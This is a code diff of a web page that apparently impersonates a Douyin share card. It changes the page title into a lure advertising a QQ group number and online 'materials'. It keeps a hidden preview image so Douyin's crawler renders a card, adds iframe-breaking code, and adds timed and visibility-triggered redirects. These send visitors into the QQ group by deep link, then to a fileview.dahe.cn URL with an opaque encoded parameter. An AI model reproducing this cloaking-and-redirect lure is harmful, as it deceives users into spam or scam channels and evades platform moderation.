@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- 抖音分享标题 -->
-    <title>桐成可【点击进入】继续访问在线看资料</title>
+    <title>桐成可【加Q裙：786371638 艺术学院38】继续访问在线看资料</title>
     
     <!-- 抖音预览卡片标签 -->
     <meta property="og:image" content="https://douyin1688.github.io/333.png">
@@ -15,7 +15,62 @@
         body {
             margin: 0;
             padding: 0;
-            background: #000;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100px;
+            height: 100px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .pulse {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.2);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(1.5);
+                opacity: 0;
+            }
         }
     </style>
 </head>
@@ -23,16 +78,44 @@
     <!-- 隐藏的预览图，仅用于抖音抓取 -->
     <img src="./333.png" alt="预览图" style="display: none; position: absolute; left: -9999px; width: 1px; height: 1px;">
     
+    <div class="container">
+        <div class="pulse"></div>
+        <div class="loading-spinner"></div>
+    </div>
+
     <script>
         // 防止页面被嵌入iframe
         if (window.top !== window.self) {
             window.top.location = window.self.location;
         }
         
-        // 延迟跳转，给抖音爬虫时间抓取
+        var hasJumped = false;
+        
+        // 2秒后跳转QQ群
         setTimeout(function() {
-            window.location.href = "https://pd.qq.com/s/ffhzse0gq?b=2";
+            if (!hasJumped) {
+                hasJumped = true;
+                window.location.href = "mqqapi://im/chat?chat_type=group&uin=786371638&src_type=internal";
+            }
         }, 2000);
+        
+        // 5秒后如果还没跳转成功，跳转到备用链接
+        setTimeout(function() {
+            if (!hasJumped) {
+                window.location.href = "https://fileview.dahe.cn/h0ZMZxgGzXm.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAHAIKAlEOBkAJBFMsKCY6H1xGUFpSXkRfU1lWX1BWR0ECHQwB";
+            }
+        }, 5000);
+        
+        // 监听页面可见性变化
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && !hasJumped) {
+                setTimeout(function() {
+                    if (!hasJumped) {
+                        window.location.href = "https://fileview.dahe.cn/h0ZMZxgGzXm.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAHAIKAlEOBkAJBFMsKCY6H1xGUFpSXkRfU1lWX1BWR0ECHQwB";
+                    }
+                }, 1000);
+            }
+        });
     </script>
 </body>
 </html>
